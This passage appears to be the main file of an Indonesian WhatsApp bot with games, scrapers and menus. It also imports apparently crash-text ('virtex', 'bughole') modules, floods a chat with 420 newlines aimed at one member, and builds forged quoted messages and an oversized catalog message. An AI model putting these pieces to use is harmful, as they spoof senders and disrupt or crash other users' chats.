// cd /sdcard && cp -r SELF-HX-main /$HOME && cd && cd SELF-HX-main && npm start
// SAYA SEBAGAI FAJARIFANDI YANG RECORD BOT INI SNDIRI
// SC NYA JANGAN DI JUAL NGENTOD
//MAKASIH DAH PAKE 
const
{
WAConnection: _WAConnection,
MessageType,
Presence,
MessageOptions,
Mimetype,
MimetypeMap,
WALocationMessage,
ChatModification,
WA_MESSAGE_STUB_TYPES,
WA_DEFAULT_EPHEMERAL,
ReconnectMode,
ProxyAgent,
GroupSettingChange,
waChatKey,
mentionedJid,
processTime
} = require("@adiwajshing/baileys")
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const hx = require('hxz-api')
const qrcode = require("qrcode-terminal")
const imgbb = require('imgbb-uploader')
const chalk = require("chalk")
const path = require('path')
const cd = 4.32e+7
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const util = require('util')
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const toHur = require('@develoka/angka-terbilang-js')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
const { webp2mp4File} = require('./lib/webp2mp4')
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const { addVote, delVote } = require('./lib/vote')
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot')

const { 
webp2gifFile, 
igDownloader, 
TiktokDownloader } = require("./lib/gif.js")

const {
tiktok, 
tiktokmusic, 
ghstalk, 
telegra, 
mediafire, 
covid, 
tahta, 
styleText, 
asmaul, 
fb, 
igstalk, 
tebakgambar, 
playstore, 
twitter, 
kodepos, 
gempa, 
servermc, 
happymod, 
kompasnews, 
tribunnews, 
igtv, 
jalantikus, 
igfoto, 
igvideo, 
hoax, 
sfilesearch, 
mcpedl, 
halal, 
wallpapper, 
apkmody, 
moddroid, 
pinterest, 
palingmurah, 
ssweb} = require('./lib/scrape.js')

const { 
 pShadow,
  pRomantic,
  pSmoke,
  pBurnPapper,
  pNaruto,
  pLoveMsg,
  pMsgGrass,
  pGlitch,
  pDoubleHeart,
  pCoffeCup,
  pLoveText,
  pButterfly } = require('./lib/photooxy')
 
const {
editor,
convert,
upsw,
fun,
tag,
dwon,
other,
bot,
vote,
code,
grup,
limit,
mutual,
premi,
dewasa,
halo,
anim,
marker,
stik,
img,
 kata, } = require('./fajar/menu.js')

const { help, help2 } = require('./fajar')
const { hole, api, beku, korak, petasan, es, mata, black, naga }= require('./stik/hole.js') //VIRTEX FAJAR GANZ
const { virtex, vipi } = require('./stik/virtex.js')
const { bughole }= require('./stik/bughole.js')

// load file
const crypto = require('crypto')
const setting = JSON.parse(fs.readFileSync('./fajar/settings.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
const autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
const { sewabot } = require('./lib/sewabot')
const { ind } = require('./bahasa')
const antivirtex = JSON.parse(fs.readFileSync('./database/antiv.json'))
const _leveling = JSON.parse(fs.readFileSync('./database/leveling.json'))
const glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
const settingg = JSON.parse(fs.readFileSync('./database/settings.json'))
const _level = JSON.parse(fs.readFileSync('./database/level.json'))
const _registered = JSON.parse(fs.readFileSync('./database/pengguna.json'))
const event = JSON.parse(fs.readFileSync('./database/event.json'))
const _limit = JSON.parse(fs.readFileSync('./database/limit.json'))
const uang = JSON.parse(fs.readFileSync('./database/uang.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const adm = JSON.parse(fs.readFileSync('./database/admin.json'))
const _heal = JSON.parse(fs.readFileSync('./database/heal.json'))
const _potion = JSON.parse(fs.readFileSync('./database/potion.json'))
const truth = JSON.parse(fs.readFileSync('./database/truth.json'))
const dare = JSON.parse(fs.readFileSync('./database/dare.json'))

const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
const wib = moment().tz('asia/jakarta').format("hh:mm:ss")
const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    let locale = "id";
    let d = new Date();
    let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let waktu = d.toLocaleDateString(locale, {
      hour: "numeric",
      minute: "numeric",
      second: "numeric",
    });

healawal = setting.healawal
potionawal = setting.potionawal
replitx = setting.replitx
ari = setting.ari
limitawal = setting.limitawal
memberlimit = setting.memberlimit
namabot = setting.namabot

cr = setting.cr
tf = setting.tf
rf = setting.rf
fer = setting.fer
yutub = setting.yutub
//ig = setting.ig
//fb = setting.fb
github = setting.github
nomerbot = setting.nomerbot

thumbnail = fs.readFileSync("./stik/virgam.jpeg") 

ownerNumber = ["6283856237829@s.whatsapp.net"]

banChats = false  //ori true
offline = false
antivo = false
autorespon = true
autojoin = true
readG = true
readP = false
targetpc = '6283856237829'
owner = '6283856237829'
fake = 'FGITDU BOTZ'
numbernye = '0'
waktu = '-'
alasan = '-'
hit_today = []

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam KAMUH'
                                        }
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
                                         }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
                                         }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
                                         }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
                                         }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
                                         }      

const getLevelingXp = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const getLevelingLevel = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }

        const getLevelingId = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].id
            }
        }

        const addLevelingXp = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (sender) => {
            const obj = {id: sender, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/level.json', JSON.stringify(_level))
        }
             
         const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }

        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/pengguna.json', JSON.stringify(_registered))
        }

        const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
        
        const addATM = (sender) => {
        	const obj = {id: sender, uang : 0}
            uang.push(obj)
            fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
        }
        
        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
            }
        }
        
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }
        
        const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
            }
        }
        	
        const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
            }
        }
        
         const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
            }
        }
        
        const slep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const bayarHeal = (sender, amount) => {
        	let position = false
            Object.keys(_heal).forEach((i) => {
            if (_heal[i].id === sender) {
            position = i
            }
            })
            if (position !== false) {
            _heal[position].heal -= amount
            fs.writeFileSync('./database/heal.json', JSON.stringify(_heal))
            }
            }
            const addHealUser = (sender, amount) => {
            let position = false
            Object.keys(_heal).forEach((i) => {
            if (_heal[i].id === sender) {
            position = i
            }
            })
            if (position !== false) {
            _heal[position].heal -= 25
            fs.writeFileSync('./database/heal.json', JSON.stringify(_heal))
            }
            }
		    const healAdd = (sender) => {
            let position = false
            Object.keys(_heal).forEach((i) => {
            if (_heal[i].id == sender) {
            position = i
            }
            })
            if (position !== false) {
            _heal[position].heal += 25
            fs.writeFileSync('./database/heal.json', JSON.stringify(_heal))
             }
             }
             const bayarPotion = (sender, amount) => {
        	let position = false
            Object.keys(_heal).forEach((i) => {
            if (_potion[i].id === sender) {
            position = i
            }
            })
            if (position !== false) {
            _potion[position].potion -= amount
            fs.writeFileSync('./database/potion.json', JSON.stringify(_potion))
            }
            }
            const addPotioUser = (sender, amount) => {
            let position = false
            Object.keys(_potion).forEach((i) => {
            if (_potion[i].id === sender) {
            position = i
            }
            })
            if (position !== false) {
            _potion[position].potion -= amount
            fs.writeFileSync('./database/potion.json', JSON.stringify(_potion))
            }
            }
		    const potionAdd = (sender) => {
            let position = false
            Object.keys(_potion).forEach((i) => {
             if (_potion[i].id == sender) {
             position = i
            }
            })
            if (position !== false) {
            _potion[position].potion += 1
            fs.writeFileSync('./database/potion.json', JSON.stringify(_potion))
            }
            }
    const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            status = true
        }
    })
    return status
}       
//=================================================//
module.exports = hexa = async (hexa, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
        if (bugc === false) return
        if (mek.key.fromMe) return
        nums = mek.participant
        tekuss = "\n".repeat(420)
         hexa.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply(`*ERR:* ${e}`) })
         hexa.sendMessage(mek.key.remoteJid, 'WAH BUG NIH', MessageType.text)
         hexa.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums]}})
        }
            global.ky_ttt
            global.join_fer
            global.prefix
			global.blocked
			m = simple.smsg(hexa, mek)
        	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        	const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
                const type = Object.keys(mek.message)[0]        
                const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
                const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message[type].fileSha256.toString('base64')) !== null && getCmd(mek.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message[type].fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const arg = body.slice(command.length + 2, body.length)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const botNumber = hexa.user.jid
		const botNumberss = hexa.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		const senderNumber = sender.split("@")[0]
		// const isSelfNumber = config.NomorSELF
		// const isOwner = sender.id === isSelfNumber
		const totalchat = await hexa.chats.all()
		const groupMetadata = isGroup ? await hexa.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const isVote = isGroup ? voting.includes(from) : false
        const conts = mek.key.fromMe ? hexa.user.jid : hexa.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? hexa.user.name : conts.notify || conts.vname || conts.name || '-'
        
        const isEventon = isGroup ? event.includes(from) : false
        const isLevelingOn = isGroup ? _leveling.includes(from) : false
        const isAntivirtex = isGroup ? antivirtex.includes(from) : false
        const isAutoSticker = isGroup ? autosticker.includes(from) : false
        const isRegistered = checkRegisteredUser(sender)
        const isPin = checkRegisteredUser(sender)
        const isOwner = ownerNumber.includes(sender)
		const isBanned = ban.includes(sender)
		const isPremium= prem.includes(sender)
		const isAdmin = adm.includes(sender)
		
		const user = hexa.user.jid
       
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
// {buttonId: 'id1', buttonText: {displayText: 'Button 1'}, type: 1},
// {buttonId: 'id2', buttonText: {displayText: 'Button 2'}, type: 1}
       const buttonMessage = {
                  contentText: text1,
                 footerText: desc1,
                 buttons: but,
                headerType: 1
          }
       hexa.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}

       const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
                          kma = gam1
                          mhan = await hexa.prepareMessage(from, kma, image)
                          
      const buttonMessages = {
                      imageMessage: mhan.message.imageMessage,
                      contentText: text1,
                     footerText: desc1,
                     buttons: but,
                     headerType: 4
         }
     hexa.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
// Pahamin dari function sendbutimage terus ini cuman gw bedain type ( ᴹᴿ᭄ғᴀᴊᴀʀ⍣⁴̅⁰͍⁴̵ & Rashid & hexagonz )
     const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
                    kma = vid1
                   mhan = await hexa.prepareMessage(from, kma, video)
                   
    const buttonMessages = {
               videoMessage: mhan.message.videoMessage,
               contentText: text1,
               footerText: desc1,
               buttons: but,
               headerType: 5
      }
         hexa.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

           const sendButLoc = async(id, text1, desc1, gam1, but = [], options = {}) => {
                      pr = await hexa.prepareMessage(id, gam1, MessageType.image,{thumbnail: fs.readFileSync('./stik/fake.jpeg')})
 loc = {
	"degreesLatitude": '',
	"degreesLongitude": '',
	"jpegThumbnail": pr.message.imageMessage
}
      hexa.sendMessage(id, {"contentText": text1,"footerText": desc1, "buttons": buttons, "headerType":6, "locationMessage": loc}, MessageType.buttonsMessage, options)
}

 const levelRole = getLevelingLevel(sender)
        var role = 'Newbie ㋡'
        if (levelRole <= 2) {
            role = 'Newbie ㋡'
        } else if (levelRole <= 4) {
            role = 'Beginner Grade 1 ⚊¹'
        } else if (levelRole <= 6) {
            role = 'Beginner Grade 2 ⚊²'
        } else if (levelRole <= 8) {
            role = 'Beginner Grade 3 ⚊³'
        } else if (levelRole <= 10) {
            role = 'Beginner Grade 4 ⚊⁴'
        } else if (levelRole <= 12) {
            role = 'Private Grade 1 ⚌¹'
        } else if (levelRole <= 14) {
            role = 'Private Grade 2 ⚌²'
        } else if (levelRole <= 16) {
            role = 'Private Grade 3 ⚌³'
        } else if (levelRole <= 18) {
            role = 'Private Grade 4 ⚌⁴'
        } else if (levelRole <= 20) {
            role = 'Private Grade 5 ⚌⁵'
        } else if (levelRole <= 30) {
            role = 'Corporal Grade 5 ☰⁵'
        } else if (levelRole <= 40) {
            role = 'Sergeant Grade 5 ≣⁵'
        } else if (levelRole <= 50) {
            role = 'Staff Grade 5 ﹀⁵'
        } else if (levelRole <= 60) {
            role = 'Sergeant Grade 5 ︾⁵'
        } else if (levelRole <= 70) {
            role = '2nd Lt. Grade 5 ♢⁵'
        } else if (levelRole <= 80) {
            role = '1st Lt. Grade 5 ♢♢⁵'
        } else if (levelRole <= 90) {
            role = 'Major Grade 5 ✷⁵'
        } else if (levelRole <= 100) {
            role = 'Colonel Grade 5 ✷✷⁵'
        
            
       var prema = 'Free'
			if (!isAdmin) {
				prema = 'Adminban'
			}
			if (!isPremium) {
				prema = 'Premium'
			} 
			if (!isOwner) {
				prema = 'Owner'
			}
	}
	
   if (isGroup && isRegistered && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 100
                const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    bayarLimit(sender, 3)
                    await reply(ind.levelup(pushname, sender, getLevelingXp,  getLevel, getLevelingLevel, role))
                }
            } catch (err) {
                console.error(err)
            }
        }
          //function check limit
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return hexa.sendMessage(from,`Limit request anda sudah habis\n\n_Note : limit bisa di dapatkan dengan cara ${prefix}buylimit dan dengan naik level_`, text,{ quoted: mek})
                            hexa.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 0 }
                        _limit.push(obj)
                        fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
                        hexa.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                    }
				}
				
			//funtion limited
           const isLimit = (sender) =>{ 
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
                    hexa.sendMessage(from, ind.limitend(pushname), text, {quoted: mek})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 0 }
                _limit.push(obj)
                fs.writeFileSync('./database/limit.json',JSON.stringify(_limit))
           return false
       }
     }

        
            if (isGroup) {
				try {
					const getmemex = groupMembers.length
					    if (getmemex <= memberlimit) {
					    }
		       } catch (err) { console.error(err)  }
        }
      
            //function balance
            if (isRegistered ) {
            const checkATM = checkATMuser(sender)
            try {
                if (checkATM === undefined) addATM(sender)
                const uangsaku = Math.floor(Math.random() * 10) + 90
                addKoinUser(sender, uangsaku)
            } catch (err) {
                console.error(err)
            }
        }
        
        //function check heal
             const checkHeal = (sender) => {
         	let foundh = false
             for (let heallmt of _heal) {
             if (heallmt.id === sender) {
             let healCounts = healawal - heallmt.heal
             if (healCounts <= 0) return hexa.sendMessage(from,`ya udah habis Heal kamu\n\n_Note : tenang Heal bisa didapatkan dengan cara ${prefix}usepotion_`, text,{ quoted: mek})
             hexa.sendMessage(from, `HEAL : ${healCounts}`, text, { quoted : mek})
             foundh = true
             }
             }
             if (foundh === false) {
             let obj = { id: sender, heal: 0 }
             _heal.push(obj)
             fs.writeFileSync('./database/heal.json', JSON.stringify(_heal))
             hexa.sendMessage(from, `HEAL : ${healCounts}`, text, { quoted : mek})
             }
	         }
		 //funtion potion
          const isPotion = (sender) =>{ 
	      let position = false
          for (let i of _potion) {
          if (i.id === sender) {
          let potions = i.potion
          if (potions >= potionawal ) {
          position = true
          hexa.sendMessage(from, `Beli Potion ngab di /buypotion`, text, {quoted: mek})
          return true
           } else {
           _potion
           position = true
           return false
           }
           }
           }
           if (position === false) {
           const obj = { id: sender, potion: 0 }
           _potion.push(obj)
           fs.writeFileSync('./database/potion.json',JSON.stringify(_potion))
           return false
            }
            }
            const checkPotion = (sender) => {
        	let foundh = false
            for (let potionlmt of _potion) {
            if (potionlmt.id === sender) {
            let potionCounts = potionawal - potionlmt.potion
            if (potionCounts <= 0) return hexa.sendMessage(from,`ya udah habis potion kamu\n\n_Note : tenang limit bisa dibeli dengan cara ${prefix}buypotion_`, text,{ quoted: mek})
            hexa.sendMessage(from, `POTION : ${potionCounts}`, text, { quoted : mek})
            foundh = true
            }
            }
           if (foundh === false) {
           let obj = { id: sender, potion: 0 }
            _potion.push(obj)
           fs.writeFileSync('./database/potion.json', JSON.stringify(_potion))
           hexa.sendMessage(from, `POTION : ${potionCounts}`, text, { quoted : mek})
            }
	        }


        //MESS
		mess = {
			wait: 'SedangDiProses......',
			success: 'Berhasil!',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			lim: 'Limit Anda Berkurang 1',
			error: {
				stick: 'bukan sticker itu:v',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Khusus grup ngab',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
			hexa.sendMessage(from, teks, text, { thumbnail: fs.readFileSync(`stik/thumb.jpeg`), sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync(`stik/thumb.jpeg`),sourceUrl:`https://wa.me/6283856237829?text=Sv Bang`}}})
		}

        const sendMess = (hehe, teks) => {
            hexa.sendMessage(hehe, teks, text)
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? hexa.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : hexa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }
        
        const sendGif = (from, gif) => {
	         hexa.sendMessage(from, gif, MessageType.video, {mimetype: "video/gif"})
       }
        
        const sendFakeImg = function(from, imageasli, caption, thumbnail, mek){
	                let ai = {
		thumbnail: thumbnail ? thumbnail : fs.readFileSync(`./stik/virgam.jpeg`),
		quoted: mek ? mek : ''
	}
	hexa.sendMessage(from, imageasli, MessageType.image, ai)
     }
     
     const fakefoto = { key: {fromMe: false, participant: `${ownerNumber}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast"}: {})}, message: {imageMessage: {caption: `Selamat ${ucapanWaktu}`, jpegThumbnail: fs.readFileSync(`stik/thumb.jpeg`)}}}

     const fakevideo = { key: {fromMe: false, participant: `${ownerNumber}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast"}: {})}, message: {videoMessage: {caption: `Selamat ${ucapanWaktu}`, jpegThumbnail: fs.readFileSync(`stik/thumb.jpeg`)}}}

     const fakelokasi = {key: {fromMe: false, participant: `${ownerNumber}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {locationMessage: {degreesLatitude: -7.0389318, degreesLongitude: 113.8969749, name: 'Tokyo, Japan', address: '@Kingfajar_.', jpegThumbnail: fs.readFileSync(`stik/thumb.jpeg`)}}}

     const fakekontak = {key: {fromMe: false, participant: `${ownerNumber}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {contactMessage: {displayName: `Selamat ${ucapanWaktu}`, vcard: 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'N:Bot;Fajar;Gans;;\n' + 'FN:Fajar-Bot\n' + 'item1.TEL;waid=6283856237829:+62 838-5623-7829\n' + 'item1.X-ABLabel:Telepon\n' + 'END:VCARD'}}}

     const faketoko = {key: {fromMe: false, participant: `${ownerNumber}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {productMessage: {product: {currencyCode: "BRL", title: `Selamat ${ucapanWaktu}`, priceAmount1000: 0, productImageCount: 0, productImage: {jpegThumbnail: fs.readFileSync(`stik/thumb.jpeg`)}}, businessOwnerJid: `${numbernye}@s.whatsapp.net`}}}

     const fakedoc = {key: {fromMe: false, participant: `${ownerNumber}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {documentMessage: {mimetype: 'application/octet-stream', title: `Selamat ${ucapanWaktu}`, pageCount: 0, fileName: `Selamat ${ucapanWaktu}`, jpegThumbnail: fs.readFileSync(`stik/thumb.jpeg`)}}}

     const fakeinvite = {key: {fromMe: false, participant: `${ownerNumber}@s.whatsapp.net`, remoteJid: `${numbernye}@s.whatsapp.net`}, message: {groupInviteMessage: {groupJid: from, inviteCode: `Selamat ${pushname}`, groupName: groupName, caption: `Selamat ${ucapanWaktu}`, jpegThumbnail: fs.readFileSync(`stik/thumb.jpeg`)}}}

     const flokasi = {key:{ fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) },message: { "locationMessage": { "name": `Selamat ${ucapanWaktu} \n⚖${pushname}`, 'jpegThumbnail': fs.readFileSync(`stik/thumb.jpeg`)}}}

     const fakeonce = { key:  {fromMe: false, remoteJid: "50768666666@g.us", participant: '0@s.whatsapp.net'}, message: { imageMessage: { "jpegThumbnail": fs.readFileSync(`stik/thumb.jpeg`), "viewOnce": true}}}        

       const katalog = (teks) => {
             res = hexa.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 99999999999999, "message": teks, "footerText": `${wib} ${pushname}`, "thumbnail": fs.readFileSync(`stik/thumb.jpeg`), "surface": 'CATALOG' }}, {FajarGanz})
             hexa.relayWAMessage(res)
        }  
        
        const fyt = (teks) => {
            hexa.sendMessage(from, teks, text, {quoted:mek, contextInfo:{"externalAdReply":{"title": fake, mediaType: 2, "thumbnailUrl": "https://telegra.ph/file/6b0259fd741e108910fbe.jpg","previewType": "VIDEO","mediaUrl": `https://youtu.be/pJU6Rr3SQ4g`}}})
        }    
        
        const fig = (teks) => {
